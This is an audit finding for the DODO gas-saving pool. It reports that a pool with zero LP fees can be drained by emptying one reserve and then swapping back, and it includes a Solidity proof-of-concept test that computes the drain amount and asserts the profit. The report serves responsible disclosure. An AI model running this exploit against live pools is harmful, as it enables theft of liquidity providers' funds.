Witty Cerulean Panther

high

# Pool can be drained if there are no LP_FEES

## Summary
The pool can be depleted because swaps allow the withdrawal of the entire balance, resulting in a reserve of 0 for a specific asset. When an asset's balance reaches 0, the PMMPricing algorithm incorrectly estimates the calculation of output amounts. Consequently, the entire pool can be exploited using a flash loan by depleting one of the tokens to 0 and then swapping back to the pool whatever is received.
## Vulnerability Detail
Firstly, as indicated in the summary, selling quote/base tokens can lead to draining the opposite token in the pool, potentially resulting in a reserve of 0. Consequently, the swapping mechanism permits someone to entirely deplete the token balance within the pool. In such cases, the calculations within the pool mechanism become inaccurate. Therefore, swapping back to whatever has been initially purchased will result in acquiring more tokens, further exacerbating the depletion of the pool.

Allow me to provide a PoC to illustrate this scenario:
```solidity
function test_poolCanBeDrained() public {
        // @review 99959990000000000000000 this amount makes the reserve 0
        // run a fuzz test, to get the logs easily I will just use this value as constant but I found it via fuzzing
        // selling this amount to the pool will make the quote token reserves "0".
        vm.startPrank(tapir);
        uint256 _amount = 99959990000000000000000;

        //  Buy shares with tapir, 10 - 10 initiate the pool
        dai.transfer(address(gsp), 10 * 1e18);
        usdc.transfer(address(gsp), 10 * 1e6);
        gsp.buyShares(tapir);

        // make sure the values are correct with my math
        assertTrue(gsp._BASE_RESERVE_() == 10 * 1e18);
        assertTrue(gsp._QUOTE_RESERVE_() == 10 * 1e6);
        assertTrue(gsp._BASE_TARGET_() == 10 * 1e18);
        assertTrue(gsp._QUOTE_TARGET_() == 10 * 1e6);
        assertEq(gsp.balanceOf(tapir), 10 * 1e18);
        vm.stopPrank();
        
        // sell such a base token amount such that the quote reserve is 0
        // I calculated the "_amount" already which will make the quote token reserve "0"
        vm.startPrank(hippo);
        deal(DAI, hippo, _amount);
        dai.transfer(address(gsp), _amount);
        uint256 receivedQuoteAmount = gsp.sellBase(hippo);

        // print the reserves and the amount received by hippo when he sold the base tokens
        console.log("Received quote amount by hippo", receivedQuoteAmount);
        console.log("Base reserve", gsp._BASE_RESERVE_());
        console.log("Quote reserve", gsp._QUOTE_RESERVE_());

        // Quote reserve is 0!!! That means the pool has 0 assets, basically pool has only one asset now!
        // this behaviour is almost always not a desired behaviour because we never want our assets to be 0 
        // as a result of swapping or removing liquidity.
        assertEq(gsp._QUOTE_RESERVE_(), 0);

        // sell the quote tokens received back to the pool immediately
        usdc.transfer(address(gsp), receivedQuoteAmount);

        // cache whatever received base tokens from the selling back
        uint256 receivedBaseAmount = gsp.sellQuote(hippo);

        console.log("Received base amount by hippo", receivedBaseAmount);
        console.log("Base target", gsp._BASE_TARGET_());
        console.log("Quote target", gsp._QUOTE_TARGET_());
        console.log("Base reserve", gsp._BASE_RESERVE_());
        console.log("Quote reserve", gsp._QUOTE_RESERVE_());
        
        // whatever received in base tokens are bigger than our first flashloan! 
        // means that we have a profit!
        assertGe(receivedBaseAmount, _amount);
        console.log("Profit for attack", receivedBaseAmount - _amount);
    }
```

Test results and logs:
<img width="529" alt="image" src="https://github.com/sherlock-audit/2023-12-dodo-gsp-mstpr/assets/120012681/ac3f07f2-281f-485e-b8df-812045f8a88b">

## Impact
Pool can be drained, funds are lost. Hence, high. Though, this can only happen when there are no "LP_FEES". However, when we check the default settings of the deployment, we see [here](https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/scripts/DeployGSP.s.sol#L22) that the LP_FEE is set to 0. So, it is ok to assume that the LP_FEES can be 0.

## Code Snippet
https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPTrader.sol#L40-L113
## Tool used

Manual Review

## Recommendation
Do not allow the pools balance to be 0 or do not let LP_FEE to be 0 in anytime.  